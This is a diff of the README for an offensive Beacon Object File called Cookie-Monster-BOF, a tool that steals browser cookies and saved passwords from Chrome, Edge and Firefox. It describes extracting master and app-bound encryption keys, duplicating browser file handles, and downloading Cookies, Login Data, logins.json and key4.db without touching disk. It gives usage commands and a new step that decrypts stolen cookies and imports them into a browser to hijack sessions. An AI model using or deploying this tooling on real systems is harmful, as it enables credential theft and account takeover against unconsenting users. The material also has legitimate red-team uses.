@@ -1,11 +1,11 @@
-# Cookie-Monster
+# Cookie-Monster-BOF
 Steal browser cookies for edge, chrome and firefox through a BOF!
 
-Cookie-Monster BOF will extract the WebKit master key and the App Bound key for both Edge and Chrome, locate a browser process with a handle to the Cookies and Login Data files, copy the handle(s) and then filelessly download the target.
+Cookie Monster BOF will extract the WebKit Master Key and the App Bound Encryption Key for both Edge and Chrome, locate a browser process with a handle to the Cookies and Login Data files, copy the handle(s) and then filelessly download the target file(s).
 
-Once the Cookies/Login Data file(s) are downloaded, the python decryption script can help extract those secrets! Firefox module will parse the profiles.ini and locate where the logins.json and key4.db files are located and download them. A seperate github repo is referenced for offline decryption.  
+Once the Cookies/Login Data file(s) are downloaded, the python decryption script can be used to extract those secrets! Firefox module will parse the profiles.ini and locate where the logins.json and key4.db files are located and download them. A seperate github repo is referenced for offline decryption.  
 
-Chrome & Edge 127+ Updates: new cookies (v20) now use app bound key to encrypt the cookies. As a result, this makes retrieving the app_bound_key slightly more difficult. Thanks to [snovvcrash](https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824) this process is a lot easier. The catch is your process must be running out of web browser's application directory. i.e. must inject into Chrome/Edge or spawn a beacon from the same application directory as the browser. 
+Chrome & Edge 127+ Updates: new chromium browser cookies (v20) use the app bound key to encrypt the cookies. As a result, this makes retrieving the app_bound_encrypted_key slightly more difficult. Thanks to [snovvcrash](https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824) this process can be accomplished without having to escalate your privileges. The catch is your process must be running out of the web browser's application directory. i.e. must inject into Chrome/Edge or spawn a beacon from the same application directory as the browser. 
  
 ## BOF Usage
 ```
@@ -13,7 +13,7 @@ Usage: cookie-monster [ --chrome || --edge || --firefox || --chromeCookiePID <pi
 cookie-monster Example: 
    cookie-monster --chrome 
    cookie-monster --edge 
-   cookie-moster --firefox 
+   cookie-monster --firefox 
    cookie-monster --chromeCookiePID 1337
    cookie-monster --chromeLoginDataPID 1337
    cookie-monster --edgeCookiePID 4444
@@ -51,6 +51,14 @@ Name: user_session
 Cookie: x123.....
 Expires: Nov 11 2023 21:25:22
 ```
+
+Decrypt Chrome/Edge Cookies File and save to json
+```
+python .\decrypt.py "\xec\xfc...." --cookie-editor
+Results Example:
+Cookies saved to cookies_for_cookie_editor.json
+```
+Import cookies JSON file with https://cookie-editor.com/ 
 
 Decrypt Chome/Edge Passwords File
 ```
